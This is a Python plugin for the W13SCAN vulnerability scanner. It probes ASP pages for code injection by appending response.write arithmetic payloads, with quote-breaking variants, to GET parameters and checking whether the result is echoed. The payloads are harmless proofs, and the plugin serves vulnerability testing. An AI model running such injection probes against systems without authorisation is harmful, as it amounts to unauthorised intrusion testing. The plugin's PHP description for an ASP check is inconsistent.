#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/7/4 5:11 PM
# @Author  : w8ay
# @File    : command_asp_code.py
import copy
import os
import random

import requests

from W13SCAN.lib.common import prepare_url
from W13SCAN.lib.const import acceptedExt, ignoreParams, Level
from W13SCAN.lib.output import out
from W13SCAN.lib.plugins import PluginBase


class W13SCAN(PluginBase):
    name = 'ASP代码注入'
    desc = '''暂只支持Get请求方式和回显型的PHP代码注入'''
    level = Level.HIGHT

    def audit(self):
        method = self.requests.command  # 请求方式 GET or POST
        headers = self.requests.get_headers()  # 请求头 dict类型
        url = self.build_url()  # 请求完整URL

        resp_data = self.response.get_body_data()  # 返回数据 byte类型
        resp_str = self.response.get_body_str()  # 返回数据 str类型 自动解码
        resp_headers = self.response.get_headers()  # 返回头 dict类型

        p = self.requests.urlparse
        params = self.requests.params
        netloc = self.requests.netloc

        if self.response.language and self.response.language != "ASP":
            return

        if method == 'GET':
            if p.query == '':
                return
            exi = os.path.splitext(p.path)[1]
            if exi not in acceptedExt:
                return

            randint1 = random.randint(10000, 90000)
            randint2 = random.randint(10000, 90000)
            randint3 = randint1 * randint2

            payloads = [
                'response.write({}*{})'.format(randint1, randint2),
                '\'+response.write({}*{})+\''.format(randint1, randint2),
                '"response.write({}*{})+"'.format(randint1, randint2),
            ]

            for k, v in params.items():
                if k.lower() in ignoreParams:
                    continue
                data = copy.deepcopy(params)
                for payload in payloads:
                    if payload[0] == "":
                        data[k] = payload
                    else:
                        data[k] = v + payload
                    url1 = prepare_url(netloc, params=data)
                    r = requests.get(url1, headers=headers)
                    html1 = r.text
                    if str(randint3) in html1:
                        out.success(url, self.name, payload="{}:{}".format(k, data[k]), raw=r.raw)
                        break
